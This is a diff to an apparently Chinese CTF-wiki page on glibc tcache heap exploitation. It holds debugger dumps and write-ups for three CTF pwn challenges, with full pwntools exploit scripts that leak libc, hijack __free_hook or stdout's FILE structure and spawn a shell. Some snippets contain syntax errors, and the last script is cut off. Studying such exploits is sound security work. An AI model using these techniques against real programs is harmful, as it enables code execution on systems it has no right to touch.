+ RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+ RIP  0x555555554808 (main+174) ?— mov    rax, qword ptr [rip + 0x200851]
 ───────────────────────────────────────[ DISASM ]────────────────────────────────────────
    0x5555555547f4 <main+154>    mov    rdi, rax
    0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
@@ -873,7 +873,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554800 <main+166>    mov    rdi, rax
    0x555555554803 <main+169>    call   free@plt <0x555555554600>
  
- ► 0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
+ ? 0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
    0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
    0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
    0x555555554817 <main+189>    lea    rsi, [rip + 0x152]
@@ -885,20 +885,20 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    13 	free(a);
    14 	free(a);
    15 
- ► 16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
+ ? 16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
    17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
    18 
    19 	return 0;
    20 }
 ────────────────────────────────────────[ STACK ]────────────────────────────────────────
-00:0000│ rsp  0x7fffffffdfb0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
-01:0008│      0x7fffffffdfb8 —▸ 0x555555756260 ◂— 0x555555756260 /* '`buUUU' */
-02:0010│      0x7fffffffdfc0 —▸ 0x7fffffffe0b0 ◂— 0x1
-03:0018│      0x7fffffffdfc8 ◂— 0x0
-04:0020│ rbp  0x7fffffffdfd0 —▸ 0x555555554870 (__libc_csu_init) ◂— push   r15
-05:0028│      0x7fffffffdfd8 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
-06:0030│      0x7fffffffdfe0 ◂— 0x0
-07:0038│      0x7fffffffdfe8 —▸ 0x7fffffffe0b8 —▸ 0x7fffffffe3d8 ◂— 0x346d2f656d6f682f ('/home/m4')
+00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x555555756260 /* '`buUUU' */
+02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
+03:0018│      0x7fffffffdfc8 ?— 0x0
+04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
+05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
+06:0030│      0x7fffffffdfe0 ?— 0x0
+07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
 pwndbg> heapinfo
 3886144
 (0x20)     fastbin[0]: 0x0
@@ -1180,8 +1180,706 @@ index 6d7a6a8..f730d7a 100644 (file)
 
 目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的check。
 
-### 0x05 建议习题：
+### 0x05 The pwn of CTF
+
+#### Challenge 1 : LCTF2018 PWN easy_heap
+
+##### 基本信息
+
+远程环境中的 libc 是 libc-2.27.so ，所以堆块申请释放过程中需要考虑 Tcache 。
+
+```shell
+zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
+[*] '/home/zj/c_study/lctf2018/easy/easy_heap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+##### 基本功能
+
+程序通过在 heap 上的一块内存( size 为 0xb0 )管理申请的堆块的头地址和我们想要写入堆块的字节数 ，总共可以申请 10 个固定大小为 0x100 的 chunk 来存放我们写入的信息 ，程序具备 show 的功能 ，可以打印堆块中的内容 ，另外程序具备删除堆块功能 ，选择删除 chunk 会先把 chunk 中的内存覆盖成 '\0' ，然后再执行 free 函数 。
+
+程序的读入输入函数存在一个 null-byte-one 漏洞 ，具体见如下代码
+
+```c
+unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
+{
+  unsigned int i; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  i = 0;                                        
+  if ( sz )
+  {
+    while ( 1 )
+    {
+      read(0, &malloc_p[i], 1uLL);
+      if ( sz - 1 < i || !malloc_p[i] || malloc_p[i] == '\n' )
+        break;
+      ++i;
+    }
+    malloc_p[i] = 0;
+    malloc_p[sz] = 0;                           // null-byte-one
+  }
+  else
+  {
+    *malloc_p = 0;
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+##### 利用思路
+
+通常来讲在堆程序中出现 null-byte-one 漏洞 ，都会考虑构造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，达到信息泄露最终劫持控制流的目的 。
+
+本题没有办法直接更改 prev_size 这一字段为 0x200 0x300 类似的值 ，所以传统上直接在几个 chunks 中间夹一个 chunk 然后 free 掉更高地址的 chunk 触发向低地址合并的方法得到大的 unsortedbin chunk 的方法在此处并不适用 。
+
+所以如果我们要实现 leak ，我们仍然需要把 main_arena 相关的地址写到一个可以 show 的 chunk 里面 。这里提供一种方法 ，先连续申请 10 个 chunk(size 0x100) ，然后连续释放 7 个 chunk ，刚好可以填满一个 tcache bin 。
+
+然后再连续释放剩下 3 个 chunk ，这 3 个 chunk 便可以进入 unsortedbin ，注意到进入 unsortedbin 的 3 个 chunk 中的第二个 chunk 的 fd ，bk 上的值 ，就会发现把第二个 chunk 作为后面我们要 unlink 掉的 target chunk 是合适的 。
+
+单独看上面的思路有点抽象 ，接下来跟着具体的 exp 来理解这个过程 ，就会比较自然 。
+
+##### 操作过程
+
+- exp 的函数定义部分
+
+```python
+from pwn import *
+local = True
+if local:
+    p = process('./easy_heap') env={'LD_PRELOAD': './libc64.so'})
+
+# aggressive alias
+r = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+se = lambda x: p.send(x)
+sel = lambda x: p.sendline(x)
+pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
+pick64 = lambda x: u64(x[:8].ljust(8, '\0'))
+
+libc = ELF('./libc64.so')
+
+def malloc(p, sz, pay):
+    ru('> ')
+    sel(str(1))
+    ru('> ')
+    sel(str(sz))
+    ru('> ')
+    se(pay)
+
+def free(p, idx):
+    ru('> ')
+    sel(str(2))
+    ru('> ')
+    sel(str(idx))
+
+def puts(p, idx):
+    ru('> ')
+    sel(str(3))
+    ru('> ')
+    sel(str(idx))
+```
+
+- 先申请 10 块 chunk ，再全部释放掉
+
+kong1 表示 heap 上数组 arr 存第一个 chunk 信息的位置 **空** 闲出来了 ( 存 chunk 地址的位置值变成 NULL ，存 size 的位置值也为 0 ) ，所以数组 arr 中的一个位置实际上占用的是 0x10 个字节
+
+```python
+    # The 10 chunks for the first application are contiguous. We numbered the chunks for the first application id0 ~ id9 so that we could track them later.
+    # 0~9
+    malloc(p, 248-1, '0'*7+'\n') #0 id0
+    malloc(p, 248-1, '1'*7+'\n') #1 id1
+    malloc(p, 248-1, '2'*7+'\n') #2 id2
+    malloc(p, 248-1, '3'*7+'\n') #3 id3
+    malloc(p, 248-1, '4'*7+'\n') #4 id4
+    malloc(p, 248-1, '5'*7+'\n') #5 id5
+    malloc(p, 248-1, '6'*7+'\n') #6 id6
+    malloc(p, 248-1, '7'*7+'\n') #7 id7
+    malloc(p, 248-1, '8'*7+'\n') #8 id8
+    malloc(p, 248-1, '9'*7+'\n') #9 id9
+    
+    # fill tcache : need 7 chunk
+    free(p, 1) #kong 1
+    free(p, 3) #kong 3
+    free(p, 5) #kong 5
+    free(p, 6) #kong 6
+    free(p, 7) #kong 7
+    free(p, 8) #kong 8
+    free(p, 9) #kong 9
+
+    #place into the unso bk : 0 2 4
+    free(p, 0) #kong 0
+    free(p, 2) #kong 2  other point : place  0x100 in prev_size of id3 chunk
+    free(p, 4) #kong 4
+```
+
+- 经过上述操作后 ，内存布局如下
+ 
+```
+#ps : heap part : tcache chunk( size 0x250 ) , next comes the chunk (size 0xb0) that manages subsequent allocations of chunks (id0-id9)
+#ps : look at id0 id2 id4 chunk
+gdb-peda$ x/300xg 0x55e5d0fdf300
+0x55e5d0fdf300:(!!!)0x0000000000000000	    0x0000000000000101    ===> id0
+0x55e5d0fdf310:	 ^  0x00007fa5c2e18ca0	    0x000055e5d0fdf500
+0x55e5d0fdf320:	 |  0x0000000000000000	    0x0000000000000000
+...............  |                           
+0x55e5d0fdf3f0:	 |  0x0000000000000000	    0x0000000000000000    
+0x55e5d0fdf400:	 |  0x0000000000000100	    0x0000000000000100    ===> id1
+0x55e5d0fdf410:	 |  0x0000000000000000	    0x0000000000000000
+...............  |                           
+0x55e5d0fdf4f0:	 |  0x0000000000000000	    0x0000000000000000
+0x55e5d0fdf500:	 +  0x0000000000000000	    0x0000000000000101    ===> id2
+0x55e5d0fdf510: (fd)0x000055e5d0fdf300	(bk)0x000055e5d0fdf700
+...............                           + 
+0x55e5d0fdf600:	    0x0000000000000100	  | 0x0000000000000100    ===> id3 
+0x55e5d0fdf610:	    0x000055e5d0fdf410	  | 0x0000000000000000
+0x55e5d0fdf620:	    0x0000000000000000	  | 0x0000000000000000
+...............                           |
+0x55e5d0fdf700:(!!!)0x0000000000000000<---+ 0x0000000000000101    ===> id4
+0x55e5d0fdf710:	    0x000055e5d0fdf500	    0x00007fa5c2e18ca0
+0x55e5d0fdf720:	    0x0000000000000000	    0x0000000000000000
+...............                             
+0x55e5d0fdf800:	    0x0000000000000100	    0x0000000000000100    ===> id5
+0x55e5d0fdf810:	    0x000055e5d0fdf610	    0x0000000000000000
+0x55e5d0fdf820:	    0x0000000000000000	    0x0000000000000000
+...............                             
+0x55e5d0fdf900:	    0x0000000000000000	    0x0000000000000101    ===> id6
+0x55e5d0fdf910:	    0x000055e5d0fdf810	    0x0000000000000000
+0x55e5d0fdf920:	    0x0000000000000000	    0x0000000000000000
+...............                             
+0x55e5d0fdfa00:	    0x0000000000000000	    0x0000000000000101    ===> id7
+0x55e5d0fdfa10:	    0x000055e5d0fdf910	    0x0000000000000000
+0x55e5d0fdfa20:	    0x0000000000000000	    0x0000000000000000
+...............                             
+0x55e5d0fdfaf0:	    0x0000000000000000	    0x0000000000000000    ===> id8
+0x55e5d0fdfb00:	    0x0000000000000000	    0x0000000000000101
+0x55e5d0fdfb10:	    0x000055e5d0fdfa10	    0x0000000000000000
+...............                             
+0x55e5d0fdfc00:	    0x0000000000000000	    0x0000000000000101    ===> id9
+0x55e5d0fdfc10:	    0x000055e5d0fdfb10	    0x0000000000000000
+0x55e5d0fdfc20:	    0x0000000000000000	    0x0000000000000000
+...............                             
+0x55e5d0fdfd00:	    0x0000000000000000	    0x0000000000020301    ===> top
+0x55e5d0fdfd10:	    0x0000000000000000	    0x0000000000000000
+
+# tcache next : id9->id8->id7->id6->id5->id3->id1
+# unsortedbin bk : id0-->id2-->id4
+```
+
+- 再连续申请 7 chunk ，使得后续的 unsortedbin chunk 有机会进入到 tcahce
+
+```python
+    #get chunk from tcache
+    malloc(p, 240, '\n') #0 id9
+    malloc(p, 240, '\n') #1 id8
+    malloc(p, 240, '\n') #2 id7
+    malloc(p, 240, '\n') #3 id6
+    malloc(p, 240, '\n') #4 id5
+    malloc(p, 240, '\n') #5 id3
+    malloc(p, 240, '\n') #6 id1
+    
+    #get id4 (id 0 2 4 get to tcache , the tcache next : 4->2->0, so get id4 first from tcache)
+    malloc(p, 240, '\n') #7 id4 ：keep the fd_of_id4 = id2
+    #get id2 (fd_of_id2->bk->fd = id2 and bk_of_id2->fd->bk = id2) satisfy the condition that unlink id2
+    malloc(p, 248, '\n') #8 id2 0xf8=248 ===>id3 prev:0x100 size:0x100
+    
+    #now id0 is in tcache , so just need free other 6 chunk to fill the tcache , and the bk_of_id0 = id2
+    free(p, 6)  #kong6   id1
+    free(p, 4)  #kong4   id5
+    free(p, 3)  #kong3   id6
+    free(p, 2)  #kong2   id7
+    free(p, 1)  #kong1   id8
+    free(p, 0)  #kong0   id9
+
+    #if free id3 will place in unsortedbin , and free id3 will find that id2 is freed , so the unlink will happen , merge to id2
+    free(p, 5)  #kong5  id3  unlink id2-->0x200
+    
+```
+
+- 经过上述操作后 ，内存布局如下
+
+```
+gdb-peda$ x/300xg 0x55e5d0fdf300
+0x55e5d0fdf300:	0x0000000000000000	0x0000000000000101    ===>  id0
+0x55e5d0fdf310:	0x0000000000000000	0x000055e5d0fdf700
+0x55e5d0fdf320:	0x0000000000000000	0x0000000000000000
+...............
+0x55e5d0fdf400:	0x0000000000000100	0x0000000000000101    ===>  #6 id1
+0x55e5d0fdf410:	0x000055e5d0fdf310	0x0000000000000000
+0x55e5d0fdf420:	0x0000000000000000	0x0000000000000000
+...............
+0x55e5d0fdf500:	0x0000000000000000	0x0000000000000201    ===>  #8 id2  can leak , becasue the #8 we can show
+0x55e5d0fdf510:	0x00007fa5c2e18ca0	0x00007fa5c2e18ca0
+0x55e5d0fdf520:	0x0000000000000000	0x0000000000000000
+...............
+0x55e5d0fdf600:	0x0000000000000100	0x0000000000000100    ===>  #5 id3
+0x55e5d0fdf610:	0x0000000000000000	0x0000000000000000
+0x55e5d0fdf620:	0x0000000000000000	0x0000000000000000
+...............
+0x55e5d0fdf700:	0x0000000000000200	0x0000000000000100    ===>  #7 id4
+0x55e5d0fdf710:	0x000055e5d0fdf300	0x00007fa5c2e18ca0
+0x55e5d0fdf720:	0x0000000000000000	0x0000000000000000
+...............
+
+```
+
+- 信息泄露
+
+```python
+    #leak the unsortedbin addr
+    puts(p, 8) #show id2
+    unso_addr = pick64(r(6))
+    print "unso_addr @ " + hex(unso_addr)
+    libc_base = unso_addr - (0x00007f94a5acbca0-0x00007f94a56e0000)
+    print "libc_base @ " + hex(libc_base)
+    free_hook = libc_base + (0x7f94a5acd8e8-0x00007f94a56e0000)
+    one_shoot = libc_base + 0x4f322     #execve("/bin/sh", rsp+0x40, environ)
+```
+
+- 改写 tcache 的 next ，再分配 chunk ，得到 shell
+
+```python
+    #get chunk from tcache
+    malloc(p, 240, '\n') #0 id9
+    malloc(p, 240, '\n') #1 id8
+    malloc(p, 240, '\n') #2 id7
+    malloc(p, 240, '\n') #3 id6
+    malloc(p, 240, '\n') #4 id5
+    malloc(p, 240, '\n') #5 id1
+    malloc(p, 240, '\n') #6 id0
+
+    #cut from the unso , the left of id2_3chunk placed in unso
+    malloc(p, 240, '\n') #9 the id2 of id2_3 tips: #8:id2 , so we can double free tcache chunk
+
+    #placed in tcache
+    free(p, 0) #kong0 id9 just for give a position to malloc
+    free(p, 8) #kong8 id2
+    free(p, 9) #kong9 id2
+
+    #get from tcache
+    malloc(p, 240, p64(free_hook) + '\n') #0 id2
+    malloc(p, 240, '\n') #8 id2
+    malloc(p, 240, p64(one_shoot) + '\n') #9 free_hook_chunk
+
+    #one_shoot triger
+    free(p, 1)  #1 id8
+    p.interactive()
+```
+
+##### Challenge 1 小结
+
+尽管作者尽力展示所有的细节 ，发现越要展示更多细节 ，越不容易讲清楚 ，所以最好画图和亲自调试一下 。简单来讲就是在某些限制下如何通过一系列的操作 tcahce chunk 和 unsortedbin 实现 unlink 。
+
+#### Challenge 2 : HITCON 2018 PWN baby_tcache
+
+##### 基本信息
+
+远程环境中的 libc 是 libc-2.27.so 和上面的题目一样。
+
+```bash
+zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
+[*] '/home/zj/c_study/hitcon2018/pwn1/baby_tcache'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+```
+
+##### 基本功能
+
+程序的功能很简单 ，就2个功能 ，一个功能为 New 申请使用内存不大于 0x2000 的 chunk ，总共可以申请 10 块 ，通过 bss 段上的一个全局数组 arr 来管理申请的 chunk ，同时 bss 段上的数组 size_arr 来存储相应 chunk 的申请大小 size 。
+
+程序的另外一个功能就是 delete ，删除所选的堆块 ，删除之前会事先把 chunk 的内容区域按照申请的 size 覆盖成 0xdadadada 。
+
+程序的漏洞代码在功能 New 的时候 ，写完数据后 ，有一个 null-byte 溢出漏洞 ，具体如下 ：
+
+```c
+int new()
+{
+  _QWORD *v0; // rax
+  signed int i; // [rsp+Ch] [rbp-14h]
+  _BYTE *malloc_p; // [rsp+10h] [rbp-10h]
+  unsigned __int64 size; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; ; ++i )
+  {
+    if ( i > 9 )
+    {
+      LODWORD(v0) = puts(":(");
+      return (signed int)v0;
+    }
+    if ( !bss_arr[i] )
+      break;
+  }
+  printf("Size:");
+  size = str2llnum();
+  if ( size > 0x2000 )
+    exit(-2);
+  malloc_p = malloc(size);
+  if ( !malloc_p )
+    exit(-1);
+  printf("Data:");
+  read_input((__int64)malloc_p, size);
+  malloc_p[size] = 0;                           //null byte bof
+  bss_arr[i] = malloc_p;
+  v0 = size_arr;
+  size_arr[i] = size;
+  return (signed int)v0;
+}
+```
+
+##### 利用思路
+
+程序的漏洞很容易发现 ，而且申请的 chunk 大小可控 ，所以一般考虑构造 overlapping chunk 处理 。但是问题在于即使把 main_arena 相关的地址写到了 chunk 上 ，也没法调用 show 功能做信息泄露 ，因为程序就没提供这个功能 。
+
+当然如果没有信息泄露也可以考虑 part write 去改掉 main_arena 相关地址的后几个字节 ，利用 tcache 机制把 `__free_hook` chunk 写进 tcache 的链表中 ，后面利用 unsortedbin attack 往 `__free_hook` 里面写上 unsortedbin addr ，后面把 `__free_hook` 分配出来 ，再利用 part write 在 `__free_hook` 里面写上 one_shoot ，不过这个方法的爆破工作量太大需要4096次 ，感兴趣的可以试试 。
+
+出题者提供一个基于文件结构体的内存读方法来实现内存泄露 ，简单说来就是修改 puts 函数工作过程中 stdout 结构的 `__IO_write_base` ，从而达到内存泄露 ，这个方法的优点在于只爆破半个字节 run 16 次即可 ，具体操作见后面的 exp 解析部分 。
+
+##### 操作过程
+
+- exp 部分
+
+```python
+from pwn import *
+r=process('./baby_tcache'),env={"LD_PRELOAD":"./libc.so.6"})
+
+libc=ELF("./libc.so.6")
+
+def menu(opt):
+    r.sendlineafter("Your choice: ",str(opt))
+
+def alloc(size,data='a'):
+    menu(1)
+    r.sendlineafter("Size:",str(size))
+    r.sendafter("Data:",data)
+
+def delete(idx):
+    menu(2)
+    r.sendlineafter("Index:",str(idx))
+
+def exp():
+    alloc(0x500-0x8)  # 0
+    alloc(0x30)   # 1
+    alloc(0x40)  # 2
+    alloc(0x50)  # 3
+    alloc(0x60)  # 4
+    alloc(0x500-0x8)  # 5
+    alloc(0x70)  # 6  gap to top
+    
+    delete(4)
+    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
+    
+    delete(2)
+    delete(0)
+    delete(5)  # backward coeleacsing
+    alloc(0x500-0x9+0x34)
+    delete(4)
+    alloc(0xa8,'\x60\x07')  # corrupt the fd
+    
+    alloc(0x40,'a')
+   
+    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure
+    
+    print repr(r.recv(8))
+    print "leak!!!!!!!!!"
+    info1 = r.recv(8)
+    print repr(info1)
+    libc.address=u64(info1)-0x3ed8b0
+    log.info("libc @ "+hex(libc.address))
+    alloc(0xa8,p64(libc.symbols['__free_hook']))
+    alloc(0x60,"A")
+    alloc(0x60,p64(libc.address+0x4f322)) # one gadget with $rsp+0x40 = NULL
+    delete(0)
+    r.interactive()
+
+if __name__=='__main__':
+
+    exp()
+```
+
+- 形成 overlapping chunk
+
+```python
+    alloc(0x500-0x8)  # 0
+    alloc(0x30)   # 1
+    alloc(0x40)  # 2
+    alloc(0x50)  # 3
+    alloc(0x60)  # 4
+    alloc(0x500-0x8)  # 5
+    alloc(0x70)  # 6  gap to top
+    
+    delete(4)
+    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
+    
+    delete(2)
+    delete(0)
+    delete(5)  # backward coeleacsing
+```
+
+```
+gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
+0x555d56ed6250:	0x0000000000000000	0x0000000000000b61  ( free(#5) ==> merge into #0 get 0x660+0x500=0xb60 chunk ) #0
+0x555d56ed6260:	0x00007fa8a0a3fca0	0x00007fa8a0a3fca0
+0x555d56ed6270:	0x0000000000000000	0x0000000000000000
+0x555d56ed6280:	0xdadadadadadadada	0xdadadadadadadada
+...............
+0x555d56ed6740:	0xdadadadadadadada	0xdadadadadadadada
+0x555d56ed6750:	0x0000000000000500	0x0000000000000040   #1
+0x555d56ed6760:	0x0000000000000061('a')	0x0000000000000000
+0x555d56ed6770:	0x0000000000000000	0x0000000000000000
+0x555d56ed6780:	0x0000000000000000	0x0000000000000000
+0x555d56ed6790:	0x0000000000000000	0x0000000000000051   #2
+0x555d56ed67a0:	0x0000000000000000	0xdadadadadadadada
+...............
+0x555d56ed67e0:	0x0000000000000000	0x0000000000000061   #3
+0x555d56ed67f0:	0x0000000000000061('a')	0x0000000000000000
+0x555d56ed6800:	0x0000000000000000	0x0000000000000000
+...............
+0x555d56ed6830:	0x0000000000000000	0x0000000000000000
+0x555d56ed6840:	0x0000000000000000	0x0000000000000071   #4
+0x555d56ed6850:	0x4141414141414141	0x4141414141414141
+...............
+0x555d56ed68b0:	0x0000000000000660	0x0000000000000500   #5
+...............
+```
+
+- 改写文件结构体的相关字段
+
+```python
+    alloc(0x500-0x9+0x34)
+    delete(4)
+    alloc(0xa8,'\x60\x07')  # corrupt the fd
+    
+    alloc(0x40,'a')
+   
+    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure !!!
+```
+
+```
+gdb-peda$ x/20xg stdout
+0x7fa8a0a40760 <_IO_2_1_stdout_>:	0x00000000fbad1800(!!!)	0x0000000000000000(!!!)
+0x7fa8a0a40770 <_IO_2_1_stdout_+16>:	0x0000000000000000(!!!)	0x0000000000000000(!!!)
+0x7fa8a0a40780 <_IO_2_1_stdout_+32>:	0x00007fa8a0a40700(!!!_IO_write_base)	0x00007fa8a0a407e3
+0x7fa8a0a40790 <_IO_2_1_stdout_+48>:	0x00007fa8a0a407e3	0x00007fa8a0a407e3
+0x7fa8a0a407a0 <_IO_2_1_stdout_+64>:	0x00007fa8a0a407e4	0x0000000000000000
+0x7fa8a0a407b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
+0x7fa8a0a407c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007fa8a0a3fa00
+0x7fa8a0a407d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
+0x7fa8a0a407e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007fa8a0a418c0
+0x7fa8a0a407f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
+gdb-peda$ x/20xg 0x00007fa8a0a40700
+0x7fa8a0a40700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007fa8a0a418b0 (leak target)
+0x7fa8a0a40710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
+0x7fa8a0a40720 <_IO_2_1_stderr_+160>:	0x00007fa8a0a3f780	0x0000000000000000
+```
+
+- 文件结构体更改缘由
+  - 通过修改 stdout->_flags 使得程序流能够流到 _IO_do_write (f , f->_IO_write_base , f->_IO_write_ptr - f->_IO_write_base) 这个函数
+  
+```c
+_flags = 0xfbad0000  // Magic number
+_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
+_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
+_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
+```
+
+```c
+int
+_IO_new_file_overflow (_IO_FILE *f, int ch)
+{
+  if (f->_flags & _IO_NO_WRITES) /* SET ERROR   !!! key 1 in fact , automatic satisfaction*/
+    {
+      f->_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return EOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
+/* !!! key 2 not into  so f->_flags fbad1800 or other is ok*/
+    {
+      :
+      :
+    }
+  if (ch == EOF)
+    return _IO_do_write (f, f->_IO_write_base,  // !!! our target
+			 f->_IO_write_ptr - f->_IO_write_base);
+
+```
+
+```c
+static
+_IO_size_t
+new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  if (fp->_flags & _IO_IS_APPENDING)  /* !!! key3 code flow into if so not into else if */
+    /* On a system without a proper O_APPEND implementation,
+       you would need to sys_seek(0, SEEK_END) here, but is
+       not needed nor desirable for Unix- or Posix-like systems.
+       Instead, just indicate that offset (before and after) is
+       unpredictable. */
+    fp->_offset = _IO_pos_BAD;
+  else if (fp->_IO_read_end != fp->_IO_write_base)
+    {
+     ............
+    }
+  count = _IO_SYSWRITE (fp, data, to_do); // Our aim f->_IO_write_base is data here , so can leak 
+
+```
+
+##### Challenge 2 小结
+
+这个程序的利用过程是一个应该学会的技巧 ，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客 。最近的 hctf2018 steak 这个程序的信息泄露多数人是通过 copy puts_addr 到 `__free_hook` 指针里 ，实现信息泄露 。实际上也可以通过修改文件结构体的字段来实现信息泄露 ，感兴趣的可以试试 。
+
+#### Challenge 3 : 2014 HITCON stkof
+
+##### 基本信息
+
+参见[unlink HITCON stkof 简介](./unlink.md#2014 HITCON stkof)
+
+##### libc 2.26 tcache 利用方法
+
+本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：
+
+
+```python
+from pwn import *
+from GdbWrapper import GdbWrapper
+from one_gadget import generate_one_gadget
+context.log_level = "info"
+context.endian = "little"
+context.word_size = 64
+context.os = "linux"
+context.arch = "amd64"
+context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
+def Alloc(io, size):
+    io.sendline("1")
+    io.sendline(str(size))
+    io.readline()
+    io.readline()
+def Edit(io, index, length, buf):
+    io.sendline("2")
+    io.sendline(str(index))
+    io.sendline(str(length))
+    io.send(buf)
+    io.readline()
+def Free(io, index):
+    io.sendline("3")
+    io.sendline(str(index))
+    try:
+        tmp = io.readline(timeout = 3)
+    except Exception:
+        io.interactive()
+    print tmp
+    if "OK" not in tmp and "FAIL" not in tmp:
+        return tmp
+def main(binary, poc):
+    # test env
+    bss_ptrlist = None
+    free_index = None
+    free_try = 2
+    elf = ELF(binary)
+    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
+    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
+    while bss_ptrlist == None:
+        # find bss ptr
+        io = process(binary)
+        gdbwrapper = GdbWrapper(io.pid)
+        # gdb.attach(io)
+        Alloc(io, 0x400)
+        Edit(io, 1, 0x400, "a" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 2, 0x400, "b" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 3, 0x400, "c" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 4, 0x400, "d" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 5, 0x400, "e" * 0x400)
+        heap = gdbwrapper.heap()
+        heap = [(k, heap[k]) for k in sorted(heap.keys())]
+        ptr_addr = []
+        index = 1
+        while True:
+            for chunk in heap:
+                address = chunk[0]
+                info = chunk[1]
+                ptr_addr_length = len(ptr_addr)
+                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
+                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
+                        if int(address, 16) + 0x10 == x["ADDR"]:
+                            tmp = gdbwrapper.search("qword", x["ADDR"])
+                            for y in tmp:
+                                if binary.split("/")[-1] in y["PATH"]:
+                                    ptr_addr.append(y["ADDR"])
+                                    break
+                        if (len(ptr_addr) != ptr_addr_length):
+                            break
+                if len(ptr_addr) != ptr_addr_length:
+                    break
+            index += 1
+            if (index == 5):
+                break
+        bss_ptrlist = sorted(ptr_addr)[0]
+        io.close()
+    while free_index == None:
+        io = process(binary)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Free(io, free_try)
+        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
+        try:
+            Alloc(io, 0x400)
+            Alloc(io, 0x400)
+        except Exception:
+            free_index = free_try
+        free_try += 1
+        io.close()
+    # arbitrary write
+    libc = ELF(binary).libc
+    one_gadget_offsets = generate_one_gadget(libc.path)
+    for one_gadget_offset in one_gadget_offsets:
+        io = process(binary)
+        libc = elf.libc
+        gdbwrapper = GdbWrapper(io.pid)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Free(io, free_index)
+        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        ###leak libc
+        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
